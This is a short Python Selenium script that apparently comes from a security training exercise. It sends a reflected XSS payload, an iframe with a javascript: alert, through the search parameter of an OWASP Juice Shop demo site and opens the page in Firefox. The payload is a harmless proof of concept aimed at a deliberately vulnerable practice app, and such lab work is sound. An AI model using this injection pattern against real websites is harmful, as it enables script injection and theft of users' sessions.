from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains

#injection of XSS function
def inject_XSS():
    #create payload and url 
    url = "https://juice-shop.herokuapp.com/#/search"
    payload = '?q=<iframe%20src%3D"javascript:alert(%60xss%60)">'
    #create payload url with JS 
    url = url + payload

    #establish session
    driver = webdriver.Firefox(options=webdriver.FirefoxOptions())
    #create a connection with the payload in url
    driver.get(url)

inject_XSS()